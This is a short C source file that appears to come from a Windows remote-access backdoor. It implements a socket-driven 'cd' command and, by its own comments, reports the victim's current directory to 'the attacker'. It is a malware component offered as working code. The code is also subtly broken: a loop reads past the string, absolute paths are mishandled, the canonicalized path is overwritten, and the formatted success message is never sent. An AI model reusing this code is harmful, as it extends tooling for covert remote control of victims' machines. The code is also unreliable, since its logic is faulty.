/*
This source file consists of functions for file system manipulation
This includes directory traversal, listing directory contents,
		uploading/downloading files, and similar functionality
*/

#include "files.h"
#include "utils.h"

/*
Change the current directory similar to using the 'cd' command in command prompt
Expects a file path and a socket
The file path can be relative ('Desktop') or absolute ('C:\Users\...\Desktop')
The socket will be used to send either an error message or the new current directory
Returns nothing, but the global 'currentDirectory' will be updated if successful
*/
void changeDirectory(char* dirName, SOCKET sock) {
	// check the length of the new un-canonicalized path
	int newLen = strnlen(dirName, 4096);
	int currLen = strnlen(currentDirectory, MAX_PATH);
	if (newLen + currLen + 1 > MAX_PATH) {
		sendString(sock, "ERROR:Path name is too long!\n");
		return;
	}
	// change any '/' in dirName to be '\'
	for (int i = 0; i < MAX_PATH; i++) {
		if (dirName[i] == '/') {
			dirName[i] = '\\'; }
	}
	// concatenate dirName to the current directory in a temporary buffer
	char buff[MAX_PATH];
	sprintf_s(buff, MAX_PATH, "%s\\%s", currentDirectory, dirName);
	// is the combined file path a directory?
	if (!PathIsDirectoryA(buff)) {
		sendString(sock, "ERROR:Path is not a directory!\n");
		return;
	}
	// try to canonicalize the file path
	if (!PathCanonicalizeA(currentDirectory, buff)) {
		sendString(sock, "ERROR:Could not canonicalize file path!\n");
		printf("Failed to canonicalize file path \"%s\" with error %d\n", buff, GetLastError());
		return;
	}
	// path is a directory and has been canonicalized
	memcpy_s(currentDirectory, MAX_PATH, buff, MAX_PATH);
	// tell the attacker what the new current directory is
	char msg[MAX_PATH + 10];
	sprintf_s(msg, MAX_PATH + 10, "SUCCESS:%s", currentDirectory);
	sendString(sock, "SUCCESS:");
}